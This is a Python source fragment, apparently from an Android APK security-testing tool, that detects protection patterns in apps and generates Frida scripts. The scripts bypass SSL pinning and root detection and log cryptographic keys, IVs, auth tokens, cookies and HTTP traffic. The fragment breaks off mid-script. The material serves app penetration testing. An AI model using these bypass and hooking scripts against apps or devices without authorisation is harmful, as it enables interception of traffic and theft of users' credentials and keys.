    root_detection_detected = False
    emulator_detection_detected = False
    anti_tampering_detected = False
    debugger_detection_detected = False
    
    # Detect SSL Pinning patterns
    ssl_patterns = [
        'certificatePinner', 'CertificatePinner', 'X509TrustManager',
        'TrustManagerFactory', 'ssl_pinning', 'checkServerTrusted',
        'SSLContext', 'HostnameVerifier', 'checkClientTrusted',
        'OkHostnameVerifier', 'pinCertificate'
    ]
    ssl_classes_found = set()
    for s in strings:
        for pattern in ssl_patterns:
            if pattern.lower() in s.value.lower():
                ssl_pinning_detected = True
                ssl_classes_found.add(pattern)
    
    # Detect Root Detection patterns
    root_patterns = [
        'isRooted', 'checkRoot', 'RootBeer', 'detectRoot', 'rootCheck',
        '/system/app/Superuser', '/system/xbin/su', 'test-keys',
        'com.noshufou.android.su', 'com.thirdparty.superuser',
        'eu.chainfire.supersu', 'com.koushikdutta.superuser',
        'com.topjohnwu.magisk', 'isDeviceRooted', 'checkForRoot'
    ]
    root_classes_found = set()
    for s in strings:
        for pattern in root_patterns:
            if pattern.lower() in s.value.lower():
                root_detection_detected = True
                root_classes_found.add(pattern)
    
    # Detect Emulator Detection patterns
    emulator_patterns = [
        'isEmulator', 'checkEmulator', 'detectEmulator', 'EMULATOR',
        'goldfish', 'sdk_gphone', 'generic_x86', 'vbox86',
        'google_sdk', 'nox', 'bluestacks', 'genymotion',
        'Andy', 'Droid4X', 'ro.kernel.qemu', 'ro.hardware.virtual'
    ]
    emulator_classes_found = set()
    for s in strings:
        for pattern in emulator_patterns:
            if pattern.lower() in s.value.lower():
                emulator_detection_detected = True
                emulator_classes_found.add(pattern)
    
    # Detect Debugger Detection patterns
    debugger_patterns = [
        'isDebuggerConnected', 'Debug.isDebuggerConnected', 'waitForDebugger',
        'android.os.Debug', 'JDWP', 'TracerPid', 'ptrace',
        'checkDebugger', 'detectDebugger', 'isDebuggable'
    ]
    debugger_classes_found = set()
    for s in strings:
        for pattern in debugger_patterns:
            if pattern.lower() in s.value.lower():
                debugger_detection_detected = True
                debugger_classes_found.add(pattern)
    
    # Detect Anti-Tampering patterns
    tampering_patterns = [
        'signature', 'checkSignature', 'verifySignature', 'PackageInfo',
        'signatures', 'GET_SIGNATURES', 'hashCode', 'checkIntegrity',
        'SafetyNet', 'Attestation', 'integrity', 'tamper'
    ]
    tampering_classes_found = set()
    for s in strings:
        for pattern in tampering_patterns:
            if pattern.lower() in s.value.lower():
                anti_tampering_detected = True
                tampering_classes_found.add(pattern)
    
    # Detect crypto patterns
    crypto_patterns = [
        ('Cipher', 'javax.crypto.Cipher'),
        ('SecretKeySpec', 'javax.crypto.spec.SecretKeySpec'),
        ('AES', 'AES encryption'),
        ('RSA', 'RSA encryption'),
        ('MessageDigest', 'java.security.MessageDigest'),
        ('Mac', 'javax.crypto.Mac'),
        ('PBKDF2', 'Key derivation'),
        ('KeyGenerator', 'javax.crypto.KeyGenerator'),
        ('EncryptedSharedPreferences', 'AndroidX encrypted storage'),
    ]
    for pattern, desc in crypto_patterns:
        for s in strings:
            if pattern in s.value:
                crypto_methods.append({
                    "pattern": pattern,
                    "description": desc,
                    "context": s.value[:100]
                })
                break
    
    # Detect authentication patterns
    auth_patterns = [
        'login', 'authenticate', 'verifyPassword', 'checkPassword',
        'validateToken', 'refreshToken', 'biometric', 'fingerprint',
        'FingerprintManager', 'BiometricPrompt', 'KeyguardManager'
    ]
    auth_methods_found = set()
    for s in strings:
        for pattern in auth_patterns:
            if pattern.lower() in s.value.lower():
                auth_methods_found.add(pattern)
    
    # =========================================================================
    # Generate SSL Pinning Bypass Script
    # =========================================================================
    ssl_bypass_script = '''// Universal SSL Pinning Bypass for ''' + package_name + '''
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f ''' + package_name + ''' -l ssl_bypass.js --no-pause

Java.perform(function() {
    console.log("[*] SSL Pinning Bypass Script Loaded");
    
    // ===== OkHttp3 CertificatePinner Bypass =====
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log('[+] OkHttp3 CertificatePinner.check() bypassed for: ' + hostname);
            return;
        };
        CertificatePinner.check$okhttp.overload('java.lang.String', 'kotlin.jvm.functions.Function0').implementation = function(hostname, peerCertificates) {
            console.log('[+] OkHttp3 CertificatePinner.check$okhttp() bypassed for: ' + hostname);
            return;
        };
        console.log('[*] OkHttp3 CertificatePinner hooks installed');
    } catch (e) {
        console.log('[-] OkHttp3 CertificatePinner not found: ' + e);
    }
    
    // ===== TrustManagerImpl (Android 7+) =====
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[+] TrustManagerImpl.verifyChain() bypassed for: ' + host);
            return untrustedChain;
        };
        console.log('[*] TrustManagerImpl hooks installed');
    } catch (e) {
        console.log('[-] TrustManagerImpl not found: ' + e);
    }
    
    // ===== X509TrustManager =====
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var TrustManager = Java.registerClass({
            name: 'com.vragent.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) { },
                checkServerTrusted: function(chain, authType) { },
                getAcceptedIssuers: function() { return []; }
            }
        });
        console.log('[*] Custom X509TrustManager registered');
    } catch (e) {
        console.log('[-] X509TrustManager registration failed: ' + e);
    }
    
    // ===== SSLContext =====
    try {
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(km, tm, sr) {
            console.log('[+] SSLContext.init() - Installing permissive TrustManager');
            var TrustManagerImpl = Java.use('com.vragent.TrustManager');
            this.init(km, [TrustManagerImpl.$new()], sr);
        };
        console.log('[*] SSLContext hooks installed');
    } catch (e) {
        console.log('[-] SSLContext hook failed: ' + e);
    }
    
    // ===== HostnameVerifier =====
    try {
        var HostnameVerifier = Java.use('javax.net.ssl.HostnameVerifier');
        var AllowAllHostnameVerifier = Java.registerClass({
            name: 'com.vragent.AllowAllHostnameVerifier',
            implements: [HostnameVerifier],
            methods: {
                verify: function(hostname, session) {
                    console.log('[+] HostnameVerifier.verify() bypassed for: ' + hostname);
                    return true;
                }
            }
        });
        console.log('[*] HostnameVerifier bypass registered');
    } catch (e) {
        console.log('[-] HostnameVerifier registration failed: ' + e);
    }
    
    // ===== Network Security Config (Android 7+) =====
    try {
        var NetworkSecurityConfig = Java.use('android.security.net.config.NetworkSecurityConfig');
        NetworkSecurityConfig.isCleartextTrafficPermitted.overload().implementation = function() {
            console.log('[+] Cleartext traffic permitted');
            return true;
        };
        console.log('[*] NetworkSecurityConfig hooks installed');
    } catch (e) {
        console.log('[-] NetworkSecurityConfig not available');
    }
    
    console.log("[*] SSL Pinning Bypass Complete - Ready to intercept traffic");
});
'''
    scripts.append(FridaScript(
        name="SSL Pinning Bypass",
        category="ssl_bypass",
        description="Universal SSL pinning bypass for OkHttp3, TrustManager, and Network Security Config",
        script_code=ssl_bypass_script,
        target_classes=["okhttp3.CertificatePinner", "javax.net.ssl.X509TrustManager", "javax.net.ssl.SSLContext"],
        target_methods=["check", "checkServerTrusted", "verify", "init"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l ssl_bypass.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Root Detection Bypass Script
    # =========================================================================
    root_bypass_script = '''// Root Detection Bypass for ''' + package_name + '''
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f ''' + package_name + ''' -l root_bypass.js --no-pause

Java.perform(function() {
    console.log("[*] Root Detection Bypass Script Loaded");
    
    // ===== RootBeer Library Bypass =====
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() {
            console.log('[+] RootBeer.isRooted() bypassed - returning false');
            return false;
        };
        RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() {
            console.log('[+] RootBeer.isRootedWithoutBusyBoxCheck() bypassed');
            return false;
        };
        RootBeer.detectRootManagementApps.implementation = function() {
            console.log('[+] RootBeer.detectRootManagementApps() bypassed');
            return false;
        };
        RootBeer.detectPotentiallyDangerousApps.implementation = function() {
            console.log('[+] RootBeer.detectPotentiallyDangerousApps() bypassed');
            return false;
        };
        RootBeer.detectTestKeys.implementation = function() {
            console.log('[+] RootBeer.detectTestKeys() bypassed');
            return false;
        };
        RootBeer.checkForBusyBoxBinary.implementation = function() {
            console.log('[+] RootBeer.checkForBusyBoxBinary() bypassed');
            return false;
        };
        RootBeer.checkForSuBinary.implementation = function() {
            console.log('[+] RootBeer.checkForSuBinary() bypassed');
            return false;
        };
        RootBeer.checkSuExists.implementation = function() {
            console.log('[+] RootBeer.checkSuExists() bypassed');
            return false;
        };
        RootBeer.checkForRWPaths.implementation = function() {
            console.log('[+] RootBeer.checkForRWPaths() bypassed');
            return false;
        };
        RootBeer.checkForDangerousProps.implementation = function() {
            console.log('[+] RootBeer.checkForDangerousProps() bypassed');
            return false;
        };
        RootBeer.checkForRootNative.implementation = function() {
            console.log('[+] RootBeer.checkForRootNative() bypassed');
            return false;
        };
        RootBeer.detectRootCloakingApps.implementation = function() {
            console.log('[+] RootBeer.detectRootCloakingApps() bypassed');
            return false;
        };
        console.log('[*] RootBeer library hooks installed');
    } catch (e) {
        console.log('[-] RootBeer library not found');
    }
    
    // ===== File.exists() for common root paths =====
    try {
        var File = Java.use('java.io.File');
        var originalExists = File.exists;
        File.exists.implementation = function() {
            var path = this.getAbsolutePath();
            var rootPaths = [
                '/system/app/Superuser.apk',
                '/system/xbin/su',
                '/system/bin/su',
                '/sbin/su',
                '/data/local/xbin/su',
                '/data/local/bin/su',
                '/data/local/su',
                '/system/sd/xbin/su',
                '/system/bin/failsafe/su',
                '/su/bin/su',
                '/magisk',
                '/sbin/.magisk',
                '/data/adb/magisk'
            ];
            for (var i = 0; i < rootPaths.length; i++) {
                if (path.indexOf(rootPaths[i]) !== -1) {
                    console.log('[+] File.exists() bypassed for root path: ' + path);
                    return false;
                }
            }
            return originalExists.call(this);
        };
        console.log('[*] File.exists() hooks installed');
    } catch (e) {
        console.log('[-] File.exists() hook failed: ' + e);
    }
    
    // ===== Runtime.exec() for su commands =====
    try {
        var Runtime = Java.use('java.lang.Runtime');
        var originalExec = Runtime.exec.overload('java.lang.String');
        Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
            if (cmd.indexOf('su') !== -1 || cmd.indexOf('which su') !== -1) {
                console.log('[+] Runtime.exec() blocked su command: ' + cmd);
                throw new Error('su not found');
            }
            return originalExec.call(this, cmd);
        };
        console.log('[*] Runtime.exec() hooks installed');
    } catch (e) {
        console.log('[-] Runtime.exec() hook failed: ' + e);
    }
    
    // ===== Build.TAGS =====
    try {
        var Build = Java.use('android.os.Build');
        var originalTags = Build.TAGS.value;
        Build.TAGS.value = 'release-keys';
        console.log('[*] Build.TAGS changed from "' + originalTags + '" to "release-keys"');
    } catch (e) {
        console.log('[-] Build.TAGS modification failed: ' + e);
    }
    
    // ===== System.getProperty =====
    try {
        var System = Java.use('java.lang.System');
        var originalGetProperty = System.getProperty.overload('java.lang.String');
        System.getProperty.overload('java.lang.String').implementation = function(key) {
            if (key === 'ro.build.tags') {
                console.log('[+] System.getProperty("ro.build.tags") bypassed');
                return 'release-keys';
            }
            if (key === 'ro.debuggable') {
                console.log('[+] System.getProperty("ro.debuggable") bypassed');
                return '0';
            }
            return originalGetProperty.call(this, key);
        };
        console.log('[*] System.getProperty() hooks installed');
    } catch (e) {
        console.log('[-] System.getProperty() hook failed: ' + e);
    }
    
    console.log("[*] Root Detection Bypass Complete");
});
'''
    scripts.append(FridaScript(
        name="Root Detection Bypass",
        category="root_bypass",
        description="Comprehensive root detection bypass for RootBeer, file checks, and build properties",
        script_code=root_bypass_script,
        target_classes=["com.scottyab.rootbeer.RootBeer", "java.io.File", "java.lang.Runtime"],
        target_methods=["isRooted", "exists", "exec"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l root_bypass.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Crypto Hooking Script
    # =========================================================================
    crypto_hook_script = '''// Cryptographic Operations Hook for ''' + package_name + '''
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f ''' + package_name + ''' -l crypto_hook.js --no-pause

Java.perform(function() {
    console.log("[*] Crypto Hook Script Loaded");
    
    // ===== javax.crypto.Cipher =====
    try {
        var Cipher = Java.use('javax.crypto.Cipher');
        
        Cipher.getInstance.overload('java.lang.String').implementation = function(transformation) {
            console.log('[CIPHER] getInstance("' + transformation + '")');
            return this.getInstance(transformation);
        };
        
        Cipher.init.overload('int', 'java.security.Key').implementation = function(mode, key) {
            var modeStr = mode === 1 ? 'ENCRYPT' : (mode === 2 ? 'DECRYPT' : mode);
            console.log('[CIPHER] init(' + modeStr + ', key)');
            console.log('  Algorithm: ' + key.getAlgorithm());
            console.log('  Key (hex): ' + bytesToHex(key.getEncoded()));
            return this.init(mode, key);
        };
        
        Cipher.doFinal.overload('[B').implementation = function(input) {
            console.log('[CIPHER] doFinal() - Input (' + input.length + ' bytes):');
            console.log('  Hex: ' + bytesToHex(input).substring(0, 100) + '...');
            try {
                console.log('  UTF8: ' + Java.use('java.lang.String').$new(input, 'UTF-8'));
            } catch(e) {}
            var result = this.doFinal(input);
            console.log('[CIPHER] doFinal() - Output (' + result.length + ' bytes):');
            console.log('  Hex: ' + bytesToHex(result).substring(0, 100) + '...');
            return result;
        };
        console.log('[*] Cipher hooks installed');
    } catch (e) {
        console.log('[-] Cipher hook failed: ' + e);
    }
    
    // ===== javax.crypto.spec.SecretKeySpec =====
    try {
        var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
        SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algorithm) {
            console.log('[KEY] SecretKeySpec created');
            console.log('  Algorithm: ' + algorithm);
            console.log('  Key (hex): ' + bytesToHex(key));
            console.log('  Key length: ' + key.length + ' bytes');
            return this.$init(key, algorithm);
        };
        console.log('[*] SecretKeySpec hooks installed');
    } catch (e) {
        console.log('[-] SecretKeySpec hook failed: ' + e);
    }
    
    // ===== javax.crypto.spec.IvParameterSpec =====
    try {
        var IvParameterSpec = Java.use('javax.crypto.spec.IvParameterSpec');
        IvParameterSpec.$init.overload('[B').implementation = function(iv) {
            console.log('[IV] IvParameterSpec created');
            console.log('  IV (hex): ' + bytesToHex(iv));
            console.log('  IV length: ' + iv.length + ' bytes');
            return this.$init(iv);
        };
        console.log('[*] IvParameterSpec hooks installed');
    } catch (e) {
        console.log('[-] IvParameterSpec hook failed: ' + e);
    }
    
    // ===== java.security.MessageDigest =====
    try {
        var MessageDigest = Java.use('java.security.MessageDigest');
        
        MessageDigest.getInstance.overload('java.lang.String').implementation = function(algorithm) {
            console.log('[HASH] MessageDigest.getInstance("' + algorithm + '")');
            return this.getInstance(algorithm);
        };
        
        MessageDigest.digest.overload('[B').implementation = function(input) {
            console.log('[HASH] digest() - Input (' + input.length + ' bytes):');
            try {
                console.log('  UTF8: ' + Java.use('java.lang.String').$new(input, 'UTF-8'));
            } catch(e) {
                console.log('  Hex: ' + bytesToHex(input).substring(0, 64) + '...');
            }
            var result = this.digest(input);
            console.log('[HASH] digest() - Output: ' + bytesToHex(result));
            return result;
        };
        console.log('[*] MessageDigest hooks installed');
    } catch (e) {
        console.log('[-] MessageDigest hook failed: ' + e);
    }
    
    // ===== javax.crypto.Mac =====
    try {
        var Mac = Java.use('javax.crypto.Mac');
        
        Mac.getInstance.overload('java.lang.String').implementation = function(algorithm) {
            console.log('[MAC] Mac.getInstance("' + algorithm + '")');
            return this.getInstance(algorithm);
        };
        
        Mac.init.overload('java.security.Key').implementation = function(key) {
            console.log('[MAC] init() with key');
            console.log('  Algorithm: ' + key.getAlgorithm());
            console.log('  Key (hex): ' + bytesToHex(key.getEncoded()));
            return this.init(key);
        };
        
        Mac.doFinal.overload('[B').implementation = function(input) {
            console.log('[MAC] doFinal() - Input: ');
            try {
                console.log('  UTF8: ' + Java.use('java.lang.String').$new(input, 'UTF-8'));
            } catch(e) {
                console.log('  Hex: ' + bytesToHex(input).substring(0, 64) + '...');
            }
            var result = this.doFinal(input);
            console.log('[MAC] doFinal() - Output: ' + bytesToHex(result));
            return result;
        };
        console.log('[*] Mac hooks installed');
    } catch (e) {
        console.log('[-] Mac hook failed: ' + e);
    }
    
    // ===== PBKDF2 Key Derivation =====
    try {
        var SecretKeyFactory = Java.use('javax.crypto.SecretKeyFactory');
        SecretKeyFactory.generateSecret.implementation = function(keySpec) {
            console.log('[PBKDF] generateSecret() called');
            var result = this.generateSecret(keySpec);
            if (keySpec.$className.indexOf('PBEKeySpec') !== -1) {
                var PBEKeySpec = Java.use('javax.crypto.spec.PBEKeySpec');
                var spec = Java.cast(keySpec, PBEKeySpec);
                console.log('  Password length: ' + spec.getPassword().length);
                console.log('  Salt (hex): ' + bytesToHex(spec.getSalt()));
                console.log('  Iterations: ' + spec.getIterationCount());
                console.log('  Key length: ' + spec.getKeyLength());
            }
            console.log('  Derived key (hex): ' + bytesToHex(result.getEncoded()));
            return result;
        };
        console.log('[*] SecretKeyFactory hooks installed');
    } catch (e) {
        console.log('[-] SecretKeyFactory hook failed: ' + e);
    }
    
    // Helper function
    function bytesToHex(bytes) {
        if (!bytes) return 'null';
        var hex = '';
        for (var i = 0; i < bytes.length; i++) {
            var b = (bytes[i] & 0xFF).toString(16);
            hex += (b.length === 1 ? '0' : '') + b;
        }
        return hex;
    }
    
    console.log("[*] Crypto Hooks Ready - All cryptographic operations will be logged");
});
'''
    scripts.append(FridaScript(
        name="Crypto Operations Hook",
        category="crypto_hook",
        description="Log all cryptographic operations including keys, IVs, and encrypted data",
        script_code=crypto_hook_script,
        target_classes=["javax.crypto.Cipher", "javax.crypto.spec.SecretKeySpec", "java.security.MessageDigest", "javax.crypto.Mac"],
        target_methods=["getInstance", "init", "doFinal", "digest", "generateSecret"],
        is_dangerous=False,
        usage_instructions=f"frida -U -f {package_name} -l crypto_hook.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Authentication Hook Script
    # =========================================================================
    auth_hook_script = '''// Authentication & Login Hook for ''' + package_name + '''
// Generated by VRAgent APK Analyzer  
// Usage: frida -U -f ''' + package_name + ''' -l auth_hook.js --no-pause

Java.perform(function() {
    console.log("[*] Authentication Hook Script Loaded");
    
    // ===== SharedPreferences (Token Storage) =====
    try {
        var SharedPreferences = Java.use('android.content.SharedPreferences');
        var Editor = Java.use('android.content.SharedPreferences$Editor');
        
        Editor.putString.implementation = function(key, value) {
            if (key.toLowerCase().indexOf('token') !== -1 || 
                key.toLowerCase().indexOf('session') !== -1 ||
                key.toLowerCase().indexOf('auth') !== -1 ||
                key.toLowerCase().indexOf('jwt') !== -1 ||
                key.toLowerCase().indexOf('cookie') !== -1) {
                console.log('[AUTH] SharedPreferences.putString()');
                console.log('  Key: ' + key);
                console.log('  Value: ' + value);
            }
            return this.putString(key, value);
        };
        
        console.log('[*] SharedPreferences hooks installed');
    } catch (e) {
        console.log('[-] SharedPreferences hook failed: ' + e);
    }
    
    // ===== HTTP Headers (Auth tokens) =====
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Request = Java.use('okhttp3.Request');
        var RequestBuilder = Java.use('okhttp3.Request$Builder');
        
        RequestBuilder.header.implementation = function(name, value) {
            var nameLower = name.toLowerCase();
            if (nameLower === 'authorization' || 
                nameLower === 'x-auth-token' ||
                nameLower === 'x-api-key' ||
                nameLower === 'cookie' ||
                nameLower.indexOf('bearer') !== -1) {
                console.log('[AUTH] HTTP Header Set');
                console.log('  Header: ' + name);
                console.log('  Value: ' + value);
            }
            return this.header(name, value);
        };
        
        RequestBuilder.addHeader.implementation = function(name, value) {
            var nameLower = name.toLowerCase();
            if (nameLower === 'authorization' || 
                nameLower === 'x-auth-token' ||
                nameLower === 'x-api-key' ||
                nameLower === 'cookie') {
                console.log('[AUTH] HTTP Header Added');
                console.log('  Header: ' + name);
                console.log('  Value: ' + value);
            }
            return this.addHeader(name, value);
        };
        console.log('[*] OkHttp header hooks installed');
    } catch (e) {
        console.log('[-] OkHttp hooks failed: ' + e);
    }
    
    // ===== Biometric Authentication =====
    try {
        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
        BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(promptInfo) {
            console.log('[BIOMETRIC] BiometricPrompt.authenticate() called');
            console.log('  Title: ' + promptInfo.getTitle());
            console.log('  Description: ' + promptInfo.getDescription());
            return this.authenticate(promptInfo);
        };
        console.log('[*] BiometricPrompt hooks installed');
    } catch (e) {
        console.log('[-] BiometricPrompt not found');
    }
    
    // ===== KeyStore (Certificate/Key Access) =====
    try {
        var KeyStore = Java.use('java.security.KeyStore');
        
        KeyStore.getKey.implementation = function(alias, password) {
            console.log('[KEYSTORE] getKey() called');
            console.log('  Alias: ' + alias);
            if (password) {
                console.log('  Password length: ' + password.length);
            }
            return this.getKey(alias, password);
        };
        
        KeyStore.getCertificate.implementation = function(alias) {
            console.log('[KEYSTORE] getCertificate("' + alias + '")');
            return this.getCertificate(alias);
        };
        console.log('[*] KeyStore hooks installed');
    } catch (e) {
        console.log('[-] KeyStore hooks failed: ' + e);
    }
    
    // ===== JWT Token Parsing =====
    try {
        // Hook Base64 decode for JWT detection
        var Base64 = Java.use('android.util.Base64');
        var originalDecode = Base64.decode.overload('[B', 'int');
        Base64.decode.overload('[B', 'int').implementation = function(input, flags) {
            var result = originalDecode.call(this, input, flags);
            try {
                var inputStr = Java.use('java.lang.String').$new(input, 'UTF-8');
                if (inputStr.indexOf('eyJ') === 0) {
                    console.log('[JWT] Potential JWT detected');
                    console.log('  Encoded: ' + inputStr.substring(0, 50) + '...');
                    var decoded = Java.use('java.lang.String').$new(result, 'UTF-8');
                    console.log('  Decoded: ' + decoded);
                }
            } catch(e) {}
            return result;
        };
        console.log('[*] Base64/JWT hooks installed');
    } catch (e) {
        console.log('[-] Base64 hooks failed: ' + e);
    }
    
    console.log("[*] Authentication Hooks Ready - Monitoring auth operations");
});
'''
    scripts.append(FridaScript(
        name="Authentication Hook",
        category="auth_hook",
        description="Monitor authentication operations, tokens, biometrics, and HTTP auth headers",
        script_code=auth_hook_script,
        target_classes=["android.content.SharedPreferences", "okhttp3.Request$Builder", "java.security.KeyStore"],
        target_methods=["putString", "header", "addHeader", "authenticate", "getKey"],
        is_dangerous=False,
        usage_instructions=f"frida -U -f {package_name} -l auth_hook.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Method Tracer Script
    # =========================================================================
    method_trace_script = '''// Method Tracing Script for ''' + package_name + '''
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f ''' + package_name + ''' -l method_trace.js --no-pause
// Modify CLASS_PATTERNS and METHOD_PATTERNS to trace specific classes/methods

var CLASS_PATTERNS = [
    // Add your target class patterns here
    "''' + package_name.replace('.', '/') + '''",
];

var METHOD_PATTERNS = [
    // Methods to always trace regardless of class
    "login", "auth", "verify", "validate", "check",
    "encrypt", "decrypt", "sign", "hash",
    "getToken", "setToken", "refreshToken",
    "sendRequest", "doPost", "doGet"
];

var EXCLUDE_PATTERNS = [
    "toString", "hashCode", "equals", "valueOf",
    "<init>", "<clinit>", "access$"
];

Java.perform(function() {
    console.log("[*] Method Tracer Script Loaded");
    console.log("[*] Tracing classes matching: " + CLASS_PATTERNS.join(", "));
    
    var tracedMethods = 0;
    var maxMethods = 500; // Prevent overload
    
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (tracedMethods >= maxMethods) return;
            
            var shouldTrace = false;
            for (var i = 0; i < CLASS_PATTERNS.length; i++) {
                if (className.indexOf(CLASS_PATTERNS[i]) !== -1) {
                    shouldTrace = true;
                    break;
                }
            }
            
            if (!shouldTrace) return;
            
            try {
                var clazz = Java.use(className);
                var methods = clazz.class.getDeclaredMethods();
                
                methods.forEach(function(method) {
                    var methodName = method.getName();
                    
                    // Skip excluded methods
                    for (var i = 0; i < EXCLUDE_PATTERNS.length; i++) {
                        if (methodName.indexOf(EXCLUDE_PATTERNS[i]) !== -1) return;
                    }
                    
                    if (tracedMethods >= maxMethods) return;
                    
                    try {
                        var overloads = clazz[methodName].overloads;
                        overloads.forEach(function(overload) {
                            overload.implementation = function() {
                                var args = [];
                                for (var i = 0; i < arguments.length; i++) {
                                    try {
                                        args.push(String(arguments[i]).substring(0, 100));
                                    } catch(e) {
                                        args.push('[unprintable]');
                                    }
                                }
                                console.log('[TRACE] ' + className + '.' + methodName + '(' + args.join(', ') + ')');
                                
                                var retval = this[methodName].apply(this, arguments);
                                
                                if (retval !== undefined) {
                                    try {
                                        console.log('[TRACE]  Return: ' + String(retval).substring(0, 200));
                                    } catch(e) {
                                        console.log('[TRACE]  Return: [unprintable]');
                                    }
                                }
                                return retval;
                            };
                            tracedMethods++;
                        });
                    } catch (e) {
                        // Method hook failed, skip
                    }
                });
            } catch (e) {
                // Class use failed, skip
            }
        },
        onComplete: function() {
            console.log("[*] Method Tracer Setup Complete - Traced " + tracedMethods + " methods");
        }
    });
});
'''
    scripts.append(FridaScript(
        name="Method Tracer",
        category="method_trace",
        description="Trace method calls in app classes with arguments and return values",
        script_code=method_trace_script,
        target_classes=[package_name],
        target_methods=["*"],
        is_dangerous=False,
        usage_instructions=f"frida -U -f {package_name} -l method_trace.js --no-pause\n# Edit CLASS_PATTERNS in script to target specific classes"
    ))
    
    # =========================================================================
    # Generate Network Traffic Logger Script
    # =========================================================================
    network_hook_script = '''// Network Traffic Logger for ''' + package_name + '''
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f ''' + package_name + ''' -l network_hook.js --no-pause

Java.perform(function() {
    console.log("[*] Network Traffic Logger Loaded");
    
    // ===== OkHttp Interceptor =====
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Request = Java.use('okhttp3.Request');
        var Response = Java.use('okhttp3.Response');
        var RequestBody = Java.use('okhttp3.RequestBody');
        var Buffer = Java.use('okio.Buffer');
        
        var Interceptor = Java.use('okhttp3.Interceptor');
        var Chain = Java.use('okhttp3.Interceptor$Chain');
        
        // Hook newCall to log requests
        var RealCall = Java.use('okhttp3.RealCall');
        RealCall.execute.implementation = function() {
            var request = this.request();
            console.log('\\n[HTTP] ');
            console.log('[HTTP] ' + request.method() + ' ' + request.url().toString());
            
            // Log headers
            var headers = request.headers();
            for (var i = 0; i < headers.size(); i++) {
                console.log('[HTTP] ' + headers.name(i) + ': ' + headers.value(i));
            }
            
            // Log body if present
            var body = request.body();
            if (body !== null) {
                try {
                    var buffer = Buffer.$new();
                    body.writeTo(buffer);
                    console.log('[HTTP] Body: ' + buffer.readUtf8());
                } catch(e) {
                    console.log('[HTTP] Body: [binary or empty]');
                }
            }
            
            var response = this.execute();
            console.log('[HTTP] Response: ' + response.code() + ' ' + response.message());
            return response;
        };
        console.log('[*] OkHttp hooks installed');
    } catch (e) {
        console.log('[-] OkHttp hooks failed: ' + e);
    }
    
    // ===== HttpURLConnection =====
    try {
        var HttpURLConnection = Java.use('java.net.HttpURLConnection');
        var URL = Java.use('java.net.URL');
        
        HttpURLConnection.connect.implementation = function() {
            console.log('[HTTP] HttpURLConnection.connect()');
            console.log('  URL: ' + this.getURL().toString());
            console.log('  Method: ' + this.getRequestMethod());
            return this.connect();
        };
        
        HttpURLConnection.getInputStream.implementation = function() {
            console.log('[HTTP] HttpURLConnection.getInputStream()');
            console.log('  URL: ' + this.getURL().toString());
            console.log('  Response Code: ' + this.getResponseCode());
            return this.getInputStream();
        };
        console.log('[*] HttpURLConnection hooks installed');
    } catch (e) {
        console.log('[-] HttpURLConnection hooks failed: ' + e);
    }
    
    // ===== Retrofit =====
    try {
        var Retrofit = Java.use('retrofit2.Retrofit');
        Retrofit.create.implementation = function(service) {
            console.log('[RETROFIT] Creating service: ' + service);
            console.log('  Base URL: ' + this.baseUrl().toString());
            return this.create(service);
        };
        console.log('[*] Retrofit hooks installed');
    } catch (e) {
        console.log('[-] Retrofit not found');
    }
    
    // ===== WebView URL Loading =====
    try {
        var WebView = Java.use('android.webkit.WebView');
        WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
            console.log('[WEBVIEW] loadUrl: ' + url);
            return this.loadUrl(url);
        };
        WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function(url, headers) {
            console.log('[WEBVIEW] loadUrl: ' + url);
            console.log('  Headers: ' + headers);
            return this.loadUrl(url, headers);
        };
        console.log('[*] WebView hooks installed');
    } catch (e) {
        console.log('[-] WebView hooks failed: ' + e);
    }
    
    console.log("[*] Network Logger Ready - All HTTP traffic will be logged");
});
'''
    scripts.append(FridaScript(
        name="Network Traffic Logger",
        category="network_hook",
        description="Log all HTTP/HTTPS requests including URLs, headers, and bodies",
        script_code=network_hook_script,
        target_classes=["okhttp3.RealCall", "java.net.HttpURLConnection", "android.webkit.WebView"],
        target_methods=["execute", "connect", "loadUrl"],
        is_dangerous=False,
        usage_instructions=f"frida -U -f {package_name} -l network_hook.js --no-pause"
    ))
    
    # =========================================================================
    # Generate Combined "All-in-One" Script
    # =========================================================================
    combined_script = f'''// Combined Security Testing Script for {package_name}
// Generated by VRAgent APK Analyzer
// This script combines SSL bypass, root bypass, and essential hooks
// Usage: frida -U -f {package_name} -l combined.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       VRAgent Combined Security Testing Script             ");
    console.log("       Package: {package_name:<36} ");
    console.log("");
    
    // ---------- SSL PINNING BYPASS ----------
